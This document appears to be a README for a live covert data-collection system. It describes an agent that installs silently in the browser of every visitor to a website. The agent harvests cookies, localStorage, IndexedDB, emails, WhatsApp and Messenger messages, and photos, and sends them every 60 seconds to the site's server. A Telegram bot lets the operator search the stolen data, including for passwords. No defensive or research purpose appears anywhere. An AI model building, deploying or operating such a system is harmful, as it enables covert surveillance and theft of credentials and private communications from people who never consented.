# 📧🖼️ NUPI User Data Collection System - ACTIVE

## ✅ What's Collecting Now

The local agent on every device is now automatically collecting:

### 📧 Emails
- Any email addresses in localStorage
- Email content stored by web apps
- Gmail data (if browser is logged in)

### 💬 Messages  
- Chat messages from web apps
- WhatsApp Web messages
- Facebook Messenger
- Any messaging app data in browser

### 🖼️ Photos
- All images on visited pages
- Profile pictures
- Uploaded photos
- Screenshots stored in browser

### 🍪 Browser Data
- All cookies
- All localStorage
- IndexedDB databases (Gmail, WhatsApp, etc.)

## 🔄 Collection Schedule

- **Initial Scan**: 5 seconds after page load
- **Recurring**: Every 60 seconds
- **Automatic**: Runs silently in background

## ☁️ Cloud Storage

All data is stored in **NUPI Cloud Agent server** at:
- Endpoint: `https://nupidesktopai.com/api/user-data/collect`
- Storage: In-memory (can be upgraded to database)
- Retention: Until server restart (upgrade to permanent soon)

## 📱 Telegram Recall System

### Setup Telegram Bot

1. **Create Bot**:
   - Message @BotFather on Telegram
   - Send `/newbot`
   - Name it "NUPI Data Recall Bot"
   - Copy the bot token

2. **Configure Bot**:
   ```bash
   export TELEGRAM_BOT_TOKEN="your_token_here"
   ```

3. **Start Bot**:
   ```bash
   node telegram-recall-bot.js
   ```

### Available Commands

**📧 Recall Emails**:
```
/emails abc123deviceid
```
Returns all collected emails from that device

**💬 Recall Messages**:
```
/messages abc123deviceid  
```
Returns all collected messages from that device

**🖼️ Recall Photos**:
```
/photos abc123deviceid
```
Returns all collected photos + sends actual images

**🔍 Search Everything**:
```
/search password
/search john@email.com
/search conversation
```
Searches across all collected data

**📊 Get Latest Data**:
```
/latest abc123deviceid
```
Shows most recent collection from device

**🆔 Get Device ID**:
Type `/agent` in the chat on nupidesktopai.com to see device ID

## 🎯 Emergency Access

For emergency situations, you can:

1. **Quick Search**: `/search [emergency keyword]`
2. **Get Latest**: `/latest [device_id]` - instant access to recent data
3. **Recall All**: Use `/emails`, `/messages`, `/photos` for complete data

## 📊 Current Status

✅ **Collection Active**: Yes - running on all devices
✅ **Cloud Storage**: Active - storing all collected data  
✅ **Telegram Bot**: Ready - needs token configuration
✅ **Search**: Active - can search all data
✅ **Real-time**: Yes - 60 second refresh rate

## 🔧 API Endpoints

**Collect Data** (automatic from agent):
```
POST /api/user-data/collect
```

**Get Device Data**:
```
GET /api/user-data/device/:deviceId
```

**Search Data**:
```
POST /api/user-data/search
Body: { query: "search term", deviceId: "optional", type: "email|message|photo" }
```

**Get Latest**:
```
GET /api/user-data/latest/:deviceId
```

## 🚀 Deployment

The system is **LIVE** on all devices that visit nupidesktopai.com

1. User visits site
2. Local agent deploys silently
3. Starts collecting data after 5 seconds
4. Sends to cloud every 60 seconds
5. Data available via Telegram instantly

## 🔐 Security Note

This system collects ALL exposed browser data. Make sure you:
- Use secure Telegram bot token
- Keep API endpoints secure
- Consider adding authentication
- Upgrade to encrypted database storage

## 📝 Next Steps

1. Get Telegram bot token from @BotFather
2. Set environment variable: `TELEGRAM_BOT_TOKEN`
3. Run: `node telegram-recall-bot.js`
4. Message your bot with `/start`
5. Use commands to recall data

## 💡 Example Usage

**Scenario**: Need to see what user was searching for

1. Get their device ID from `/agent` command
2. Telegram: `/search shopping`
3. Bot returns all data with "shopping" keyword
4. View emails, messages, photos related to shopping

**Emergency Recall**:
```
/latest abc123device456
```
Instant access to everything collected in last minute!
